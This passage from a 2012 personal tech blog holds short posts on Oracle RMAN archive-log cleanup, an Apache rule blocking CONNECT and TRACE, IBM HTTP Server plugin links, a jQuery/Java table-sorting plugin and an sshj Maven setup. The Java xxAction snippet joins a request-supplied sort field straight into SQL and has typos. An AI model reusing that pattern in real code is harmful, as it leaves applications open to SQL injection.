<h1 id="to-clean-archive-log"><a href="#to-clean-archive-log" class="headerlink" title="to clean archive log"></a>to clean archive log</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rman target / (rman target sys/sys@dbname more than one instance)</span><br><span class="line">RMAN&gt;list archivelog all;</span><br></pre></td></tr></table></figure>

<p>  method 1：<br>  <code>RMAN&gt;delete archivelog until time &#39;sysdate-1&#39;;</code></p>
<p>  method 2：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv arch_1_1234.arc /tmp</span><br><span class="line">RMAN&gt;crosscheck archivelog all;</span><br><span class="line">RMAN&gt;list expired archivelog all;</span><br><span class="line">RMAN&gt;delete expired archivelog all;</span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p> <a target="_blank" rel="noopener" href="http://www.cumt.org/blog/585">http://www.cumt.org/blog/585</a><br> <a target="_blank" rel="noopener" href="http://www.cnblogs.com/woody-wu/archive/2009/08/23/1552372.html">http://www.cnblogs.com/woody-wu/archive/2009/08/23/1552372.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Block-CONNECT-method-in-httpd.conf" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-09-04T01:28:54.000Z"><a href="/2012/09/04/Block-CONNECT-method-in-httpd.conf/">2012-09-04</a></time>
      
      
  
    <h1 class="title"><a href="/2012/09/04/Block-CONNECT-method-in-httpd.conf/">Block CONNECT method in httpd.conf</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;REQUEST_METHOD&#125; ^(CONNECT|TRACE)$</span><br><span class="line">RewriteRule ^.*$ - [L,F]</span><br><span class="line">ProxyRequests Off</span><br></pre></td></tr></table></figure>

<p>ProxyRequest should be set to off, unless you have security protect in your web server.</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-IBM-HTTP-Server-&amp;-Websphere-Plugin" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-08-17T05:41:49.000Z"><a href="/2012/08/17/IBM-HTTP-Server-&-Websphere-Plugin/">2012-08-17</a></time>
      
      
  
    <h1 class="title"><a href="/2012/08/17/IBM-HTTP-Server-&-Websphere-Plugin/">IBM HTTP Server &amp; Websphere Plugin</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>Understanding the WebSphere Application Server Web server plug-in</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://public.dhe.ibm.com/software/dw/wes/pdf/WASWebserverplug-in.pdf">http://public.dhe.ibm.com/software/dw/wes/pdf/WASWebserverplug-in.pdf</a></p>
<ul>
<li>Understanding IBM HTTP Server plug-in Load Balancing in a clustered environment</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?rs=180&amp;uid=swg21219567">http://www-01.ibm.com/support/docview.wss?rs=180&amp;uid=swg21219567</a></p>
<ul>
<li>Best Practice: WebSphere HTTP Plugin Failover for High Volume Web Sites</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/websphere/library/bestpractices/plugin_failover_hvws.html">http://www.ibm.com/developerworks/websphere/library/bestpractices/plugin_failover_hvws.html</a></p>
<ul>
<li>Understanding HTTP plug-in failover in a clustered environment</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21219808">http://www-01.ibm.com/support/docview.wss?uid=swg21219808</a></p>
<ul>
<li>How do the properties ServerIOTimeout and PostBufferSize affect plug-in behavior</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21408884">http://www-01.ibm.com/support/docview.wss?uid=swg21408884</a><br><a target="_blank" rel="noopener" href="https://www.ibm.com/developerworks/mydeveloperworks/blogs/Dougclectica/entry/websphere_session_ids22?lang=en">https://www.ibm.com/developerworks/mydeveloperworks/blogs/Dougclectica/entry/websphere_session_ids22?lang=en</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-jQuery-Sorting-Plugin" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-07-20T06:50:21.000Z"><a href="/2012/07/20/jQuery-Sorting-Plugin/">2012-07-20</a></time>
      
      
  
    <h1 class="title"><a href="/2012/07/20/jQuery-Sorting-Plugin/">jQuery Sorting Plugin</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="xxAction"><a href="#xxAction" class="headerlink" title="xxAction()"></a>xxAction()</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pubilc void xxAction()&#123;</span><br><span class="line">  String orderBy = request.getParameter(&quot;orderBy&quot;);</span><br><span class="line">  System.out.println(&quot;orderBy &quot; + orderBy);</span><br><span class="line"></span><br><span class="line">  String sql = &quot;select x.a, x.b from xx&quot;;</span><br><span class="line"></span><br><span class="line">  if (orderBy != null &amp;&amp; orderBy.length() &gt; 0) &#123;</span><br><span class="line">    sql += &quot; order by &quot;</span><br><span class="line">        + fieldSort.getSortBy()</span><br><span class="line">        + (fieldSort.getAsc().equals(Boolean.TRUE) ? &quot; asc&quot;</span><br><span class="line">            : &quot; desc&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    orderBy = &quot;xx&quot;;</span><br><span class="line">    sql += &quot; order by &quot; + orderBy;</span><br><span class="line"></span><br><span class="line">    request.setAttribute(&quot;sortBy&quot;, orderBy);</span><br><span class="line">    request.setAttribute(&quot;order&quot;, &quot;up&quot;);</span><br><span class="line">    fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">    fieldSort.setSortBy(orderBy);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="FieldSort-java"><a href="#FieldSort-java" class="headerlink" title="FieldSort.java"></a>FieldSort.java</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line">public class FieldSort implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">  private static final long serialVersionUID = 5877056172946099482L;</span><br><span class="line">  private String sortBy;</span><br><span class="line">  private Boolean asc;</span><br><span class="line"></span><br><span class="line">  private FieldSort() &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public String getSortBy() &#123;</span><br><span class="line">    return sortBy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setSortBy(String sortBy) &#123;</span><br><span class="line">    this.sortBy = sortBy;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public Boolean getAsc() &#123;</span><br><span class="line">    return asc;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void setAsc(Boolean asc) &#123;</span><br><span class="line">    this.asc = asc;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static FieldSort createSorting(HttpServletRequest request,</span><br><span class="line">      String orderBy, String className) &#123;</span><br><span class="line">    String orderKey = className + &quot;lastFieldSort&quot;;</span><br><span class="line">    Object lastFieldSort = request.getSession().getAttribute(orderKey);</span><br><span class="line">    FieldSort fieldSort = null;</span><br><span class="line"></span><br><span class="line">    if (lastFieldSort == null) &#123;</span><br><span class="line">      fieldSort = new FieldSort();</span><br><span class="line">      fieldSort.setSortBy(orderBy);</span><br><span class="line">      fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      fieldSort = (FieldSort) lastFieldSort;</span><br><span class="line"></span><br><span class="line">      if (fieldSort.getSortBy() != null</span><br><span class="line">          &amp;&amp; fieldSort.getSortBy().equals(orderBy)) &#123;</span><br><span class="line">        if (fieldSort.getAsc().equals(Boolean.TRUE)) &#123;</span><br><span class="line">          fieldSort.setAsc(Boolean.FALSE);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        fieldSort.setSortBy(orderBy);</span><br><span class="line">        fieldSort.setAsc(Boolean.TRUE);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request.setAttribute(&quot;sortBy&quot;, fieldSort.getSortBy());</span><br><span class="line">    request.getSession().setAttribute(orderKey, fieldSort);</span><br><span class="line">    if (fieldSort.getAsc().equals(Boolean.FALSE)) &#123;</span><br><span class="line">      request.setAttribute(&quot;order&quot;, &quot;down&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      request.setAttribute(&quot;order&quot;, &quot;up&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return fieldSort;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="jquery-sortingTable-js"><a href="#jquery-sortingTable-js" class="headerlink" title="jquery.sortingTable.js"></a>jquery.sortingTable.js</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">(function($) &#123;</span><br><span class="line">  $.fn.sortingTable = function(options)&#123;</span><br><span class="line">    $(&quot;head&quot;).append(&quot;&lt;style type=&#x27;text/css&#x27;&gt;.link &#123; cursor: pointer&#125;)&lt;/style&gt;&quot;);</span><br><span class="line"></span><br><span class="line">    var opts = $.extend(&#123;&#125;, $.fn.sortingTable.defaults, options);</span><br><span class="line"></span><br><span class="line">    var tableId = this.attr(&#x27;id&#x27;);</span><br><span class="line">    var formName = opts.formName;</span><br><span class="line"></span><br><span class="line">    $(&quot;form[name=&#x27;&quot; + formName + &quot;&#x27;]&quot;).append(&#x27;&lt;input type=&quot;hidden&quot; name=&quot;orderBy&quot; value=&quot;&quot;&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">    if( opts.sortColumns.length &gt; 0 )&#123;</span><br><span class="line">      $.each(opts.sortColumns, function(col)&#123;</span><br><span class="line">        $(&#x27;#&#x27; + tableId + &quot; thead th:eq(&quot; + (col - 1) +&quot;)&quot;).addClass(&quot;link&quot;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;else if(opts.excludeSortColumns.length == 0) &#123;</span><br><span class="line">      this.find(&quot;thead th&quot;).addClass(&quot;link&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if( opts.excludeSortColumns.length &gt; 0 )&#123;</span><br><span class="line">      this.find(&#x27;thead th&#x27;).each(function(index, dom)&#123;</span><br><span class="line">        if($.inArray((index + 1), opts.excludeSortColumns) == -1)&#123;</span><br><span class="line">          $(this).addClass(&quot;link&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    this.find(&quot;thead th&quot;).each(function()&#123;</span><br><span class="line">      if( $(this).hasClass(&quot;link&quot;) ) &#123;</span><br><span class="line">        $(this).click(function()&#123;</span><br><span class="line">          var id = $(this).attr(&#x27;id&#x27;);</span><br><span class="line">          $(&quot;:hidden[name=&#x27;orderBy&#x27;]&quot;).val(id);</span><br><span class="line"></span><br><span class="line">          var form = $(&quot;form[name=&#x27;&quot; + formName + &quot;&#x27;]&quot;);</span><br><span class="line">          form.submit();</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    sorting(this, opts.sortBy, opts.order);</span><br><span class="line"></span><br><span class="line">    $.each(opts.mergeColumns, function(num)&#123;</span><br><span class="line">      _w_table_rowspan(&#x27;#&#x27; + tableId, num);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  var sorting = function(table, sortBy, order)&#123;</span><br><span class="line">    var position = 0;</span><br><span class="line">    var header = &#x27;&#x27;;</span><br><span class="line">    table.find(&quot;thead th&quot;).each(function(index, dom)&#123;</span><br><span class="line">      if(sortBy == $(dom).attr(&#x27;id&#x27;))&#123;</span><br><span class="line">        position = index;</span><br><span class="line">        header = $(dom).text();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    table.find(&quot;thead th:eq(&quot; + position + &quot;)&quot;).html(&quot;&lt;font color=&#x27;yellow&#x27;&gt;&quot; + header + &quot;&lt;/font&gt;&amp;nbsp;&lt;img src=&#x27;images/arrow_&quot; + order + &quot;.gif&#x27;/&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  var _w_table_rowspan = function(_w_table_id,_w_table_colnum)&#123;</span><br><span class="line">    _w_table_firsttd = &quot;&quot;;</span><br><span class="line">    _w_table_currenttd = &quot;&quot;;</span><br><span class="line">    _w_table_SpanNum = 0;</span><br><span class="line">    _w_table_Obj = $(_w_table_id + &quot; tr td:nth-child(&quot; + _w_table_colnum + &quot;)&quot;);</span><br><span class="line">    _w_table_Obj.each(function(i)&#123;</span><br><span class="line">       if(i==0)&#123;</span><br><span class="line">           _w_table_firsttd = $(this);</span><br><span class="line">           _w_table_SpanNum = 1;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           _w_table_currenttd = $(this);</span><br><span class="line">           if(_w_table_firsttd.text()==_w_table_currenttd.text())&#123;</span><br><span class="line">                //var firstSection = _w_table_firsttd.parent().find(&#x27;td:eq(4)&#x27;).text();</span><br><span class="line">                //var currentSection = _w_table_currenttd.parent().find(&#x27;td:eq(4)&#x27;).text();</span><br><span class="line"></span><br><span class="line">                 _w_table_SpanNum++;</span><br><span class="line">                 _w_table_currenttd.hide(); //remove();</span><br><span class="line">                 _w_table_firsttd.attr(&quot;rowSpan&quot;,_w_table_SpanNum);</span><br><span class="line">           &#125;else&#123;</span><br><span class="line">               _w_table_firsttd = $(this);</span><br><span class="line">               _w_table_SpanNum = 1;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $.fn.sortingTable.defaults = &#123;</span><br><span class="line">    formName: &#x27;form1&#x27;,</span><br><span class="line">    sortBy: &#x27;&#x27;,</span><br><span class="line">    order: &#x27;asc&#x27;,</span><br><span class="line">    sortColumns: [],</span><br><span class="line">    excludeSortColumns: [],</span><br><span class="line">    mergeColumns: []</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)(jQuery)</span><br></pre></td></tr></table></figure>

<h1 id="xx-html"><a href="#xx-html" class="headerlink" title="xx.html"></a>xx.html</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">$(function()&#123;</span><br><span class="line">  $(&quot;#result&quot;).sortingTable(&#123;</span><br><span class="line">    formName: &#x27;form1&#x27;,</span><br><span class="line">    sortBy: &#x27;$&#123;sortBy&#125;&#x27;,</span><br><span class="line">    order: &#x27;$&#123;order&#125;&#x27;,</span><br><span class="line">    excludeSortColumns: [1],</span><br><span class="line">    mergeColumns: [1, 2, 3, 10]</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;table id=&quot;result&quot; border=&quot;1&quot;&gt;</span><br><span class="line">  &lt;thead&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;th id=&quot;xx.a&quot;&gt;Chapter&lt;/th&gt;</span><br><span class="line">    &lt;th id=&quot;xx.b&quot;&gt;Section/Regulation&lt;/th&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;/thead&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Call-command-through-sshj" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-07-10T06:48:21.000Z"><a href="/2012/07/10/Call-command-through-sshj/">2012-07-10</a></time>
      
      
  
    <h1 class="title"><a href="/2012/07/10/Call-command-through-sshj/">Call command through sshj</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h3 id="create-a-maven-project-mvn-archetype-generate"><a href="#create-a-maven-project-mvn-archetype-generate" class="headerlink" title="create a maven project mvn archetype:generate"></a>create a maven project <code>mvn archetype:generate</code></h3><h3 id="copy-sshj’s-dependency-to-pom-xml"><a href="#copy-sshj’s-dependency-to-pom-xml" class="headerlink" title="copy sshj’s dependency to pom.xml"></a>copy sshj’s dependency to pom.xml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">  &lt;groupId&gt;dh&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;ssh-remote&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">  &lt;name&gt;ssh-remote&lt;/name&gt;</span><br><span class="line">  &lt;url&gt;http://maven.apache.org&lt;/url&gt;</span><br><span class="line"></span><br><span class="line">  &lt;properties&gt;</span><br><span class="line">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;3.8.1&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;net.schmizz&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;sshj&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;0.8.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.6.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;logback-core&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;0.9.29&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;0.9.29&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;build&gt;</span><br><span class="line"> &lt;plugins&gt;</span><br><span class="line">  &lt;plugin&gt;</span><br><span class="line">   &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;1.1.1&lt;/version&gt;</span><br><span class="line">   &lt;executions&gt;</span><br><span class="line">    &lt;execution&gt;</span><br><span class="line">     &lt;phase&gt;test&lt;/phase&gt;</span><br><span class="line">     &lt;goals&gt;</span><br><span class="line">      &lt;goal&gt;java&lt;/goal&gt;</span><br><span class="line">     &lt;/goals&gt;</span><br><span class="line">     &lt;configuration&gt;</span><br><span class="line">      &lt;mainClass&gt;dh.App&lt;/mainClass&gt;</span><br><span class="line">      &lt;arguments&gt;</span><br><span class="line">       &lt;argument&gt;arg0&lt;/argument&gt;</span><br><span class="line">       &lt;argument&gt;arg1&lt;/argument&gt;</span><br><span class="line">      &lt;/arguments&gt;</span><br><span class="line">     &lt;/configuration&gt;</span><br><span class="line">    &lt;/execution&gt;</span><br><span class="line">   &lt;/executions&gt;</span><br><span class="line">  &lt;/plugin&gt;</span><br><span class="line"> &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<h3 id="create-logback-xml"><a href="#create-logback-xml" class="headerlink" title="create logback.xml"></a>create logback.xml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line"></span><br><span class="line">  &lt;appender name=&quot;STDOUT&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class="line">    &lt;!-- encoders are assigned the type</span><br><span class="line">         ch.qos.logback.classic.encoder.PatternLayoutEncoder by default --&gt;</span><br><span class="line">    &lt;encoder&gt;</span><br><span class="line">      &lt;pattern&gt;%d&#123;HH:mm&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n&lt;/pattern&gt;</span><br><span class="line">    &lt;/encoder&gt;</span><br><span class="line">  &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- appender name=&quot;STDOUT&quot;</span><br><span class="line">			class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class="line">		&lt;layout class=&quot;ch.qos.logback.classic.PatternLayout&quot;&gt;</span><br><span class="line">			